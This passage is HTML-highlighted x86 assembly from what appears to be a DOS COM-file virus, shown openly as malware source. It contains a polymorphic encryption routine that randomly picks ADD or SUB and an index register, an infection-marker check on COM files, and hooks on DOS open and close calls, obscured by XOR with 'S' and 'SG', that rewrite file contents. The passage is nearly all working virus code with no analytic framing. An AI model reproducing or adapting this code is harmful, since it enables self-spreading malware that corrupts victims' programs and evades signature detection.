         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">crypt_key</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; AH = 8-bit random number</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">00000001b</span><span class="sc0">    </span><span class="sc1">; AH = 16-bit index register</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">index_reg__</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">    </span><span class="sc1">; Store 16-bit index register</span><span class="sc0">

         </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; AL = 8-bit random number</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; AH = encryption/decryption algor...</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">00000001b</span><span class="sc0">    </span><span class="sc1">; AH =       "              "</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">crypt_algo</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">     </span><span class="sc1">; Store encryption/decryption algo...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5eh</span><span class="sc0">      </span><span class="sc1">; POP SI (opcode 5eh)</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">index_reg__</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; POP reg16</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">pop_reg16</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">; Store POP reg16</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">crypt_algo</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AL = encryption/decryption algor...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Zero AH</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">algo_table</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; SI = offset of decryption algori...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; AL = decryption algorithme</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">decrypt_algo</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">; Store decryption algorithme</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; AL = 16-bit index register</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">index_reg__</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; AL =   "      "      "</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">index_reg</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">; Store 16-bit index register</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c6h</span><span class="sc0">         </span><span class="sc1">; AL = 16-bit index register</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">index_reg__</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; AL =   "      "      "</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">index_reg_</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; Store 16-bit index register</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">add_idx_imm8</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">  </span><span class="sc1">; Store 8-bit immediate</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">crypt_algo</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AL = encryption/decryption algor...</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000001b</span><span class="sc0">    </span><span class="sc1">; Invert first bit of AL</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Zero AH</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">algo_table</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; SI = offset of encryption algori...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; AL = encryption algorithme</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">encrypt_algo</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">; Store encryption algorithme</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; SI = offset of beginning of code</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Zero DI</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">head_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">move_virus_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of virus</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store byte of virus</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">move_virus_</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">crypt_begin</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc1">; SI = offset of crypt_begin</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">crypt_size</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; CX = number of bytes to encrypt</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">crypt_key</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; AX = encryption/decryption key</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">encrypt_loop</span><span class="sc0">
</span><span class="sc5">encrypt_loop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">encrypt_algo</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">; Encryption algorithme</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; Encrypt two bytes</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">; SI = offset of next encrypted byte</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">encrypt_loop</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">index_reg__</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; 16-bit index register</span><span class="sc0">
</span><span class="sc5">crypt_algo</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Encryption/decryption algortihme</span><span class="sc0">
</span><span class="sc5">algo_table</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">; ADD segment:[index],AX</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">29h</span><span class="sc0">         </span><span class="sc1">; SUB segment:[index],AX</span><span class="sc0">

</span><span class="sc5">test_infect</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Test for previously infection</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of filename</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; End of filename?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_infect</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to test_infect</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; SI = offset of file extension</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX = two bytes of file extension</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0101111101011111b</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SG'</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc12">'OC'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'SG'</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; COM executable?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">tst_inf_exit</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to tst_inf_exit</span><span class="sc0">

         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of file extension</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">         </span><span class="sc1">; Allready infected?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">tst_inf_exit</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to tst_inf_exit</span><span class="sc0">

         </span><span class="sc6">clc</span><span class="sc0">             </span><span class="sc1">; Clear carry flag</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
</span><span class="sc5">tst_inf_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">stc</span><span class="sc0">             </span><span class="sc1">; Set carry flag</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">test_functio</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Test DOS function number</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">3dh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Open file?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_create</span><span class="sc0">      </span><span class="sc1">; Equal? Jump to jmp_create</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">3eh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Close file?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_delete</span><span class="sc0">      </span><span class="sc1">; Equal? Jump to jmp_delete</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">jmp_create</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">create_clean</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">jmp_delete</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">delete_clean</span><span class="sc0">
</span><span class="sc5">create_clean</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (CS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; SI = offset of filename</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">filename</span><span class="sc0">     </span><span class="sc1">; DI = offset of filename</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; Move sixty-four bytes of the fil...</span><span class="sc0">
</span><span class="sc5">move_name</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of filename</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store byte of filename</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">move_name</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">3ch</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Create file</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; CX = file attributes</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">filename</span><span class="sc0">     </span><span class="sc1">; DX = offset of filename</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">store_handle</span><span class="sc0">    </span><span class="sc1">; No error? Jump to store_handle</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">clean_exit</span><span class="sc0">
</span><span class="sc5">store_handle</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; BP = file handle</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">file_handle_</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; Store file handle</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">filename</span><span class="sc0">     </span><span class="sc1">; SI = offset of filename</span><span class="sc0">
</span><span class="sc5">find_zero__</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of filename</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; End of filename?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_zero__</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to find_zero__</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">; SI = offset of last character by...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">   </span><span class="sc1">; Store last byte of file extension</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">3d00h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'SG'</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Open file (read)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SG'</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">filename</span><span class="sc0">     </span><span class="sc1">; DX = offset of filename</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">store_extens</span><span class="sc0">    </span><span class="sc1">; No error? Jump to store_extens</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">clean_exit</span><span class="sc0">
</span><span class="sc5">store_extens</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; BX = file handle</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0">  </span><span class="sc1">; Store last byte of file extension</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0bf00h</span><span class="sc0">       </span><span class="sc1">; AX = segment of text video RAM</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS =    "    "   "     "    "</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">4202h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'SG'</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Set current file position (EOF)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SG'</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,-</span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">; CX = end of file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,-(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">head_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; SI = original filesize</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">head_begin</span><span class="sc4">)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">3fh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Read from file</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">head_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; BX = file handle</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Write to file</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">head_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; BX = file handle</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">4200h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'SG'</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Set current file position (SOF)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SG'</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Zero CX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">head_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
</span><span class="sc5">tst_file_pos</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">        </span><span class="sc1">; CX = number of bytes to read</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Read less than four thousand and...</span><span class="sc0">
         </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">read_file</span><span class="sc0">       </span><span class="sc1">; Above or equal? Jump to read_file</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; CX = number of bytes to read</span><span class="sc0">
</span><span class="sc5">read_file</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; DI = number of bytes to read</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">3fh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Read from file</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; CX = number of bytes actually read</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; BX = file handle</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Write to file</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; BX = file handle</span><span class="sc0">

